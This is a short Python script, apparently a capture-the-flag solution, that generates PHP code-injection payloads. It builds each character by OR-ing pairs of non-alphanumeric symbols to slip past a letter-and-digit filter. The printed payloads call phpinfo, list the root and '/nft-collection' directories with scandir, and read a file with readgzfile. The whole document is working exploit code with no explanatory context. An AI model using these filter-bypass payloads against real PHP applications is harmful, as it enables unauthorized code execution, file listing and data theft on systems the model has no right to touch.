import string

def make_payload(pay):
  # pay = "</pre>"
  w = {c:[] for c in pay}
  cand = '0123456789!#$%&()*+,-./:;<=>?@[]^_{|}~"\''
  for c in cand:
      if c not in string.ascii_letters:
          for d in cand:
              if d not in string.ascii_letters:
                  f = chr(ord(c)|ord(d))
                  if f in w and not w[f]:
                      w[f].append((c, d))

  one = []
  two = []
  for c in pay:
    one.append(w[c][0][0])
    two.append(w[c][0][1])

  return f'"{"".join(one)}"|"{"".join(two)}"'


final_payload = f"""
  ({make_payload('phpinfo')})();
"""

print(final_payload)

# (var_dump)((scandir)('/'));
final_payload = f"""
({make_payload("var_dump")})(({make_payload('scandir')})({make_payload('/')}));
"""

print(final_payload);

final_payload = f"""
({make_payload("var_dump")})(({make_payload('scandir')})({make_payload('/nft-collection')}));
"""

print(final_payload);

final_payload = f"""
({make_payload("readgzfile")})({make_payload("/nft-collection/nft002")});
"""

print(final_payload);


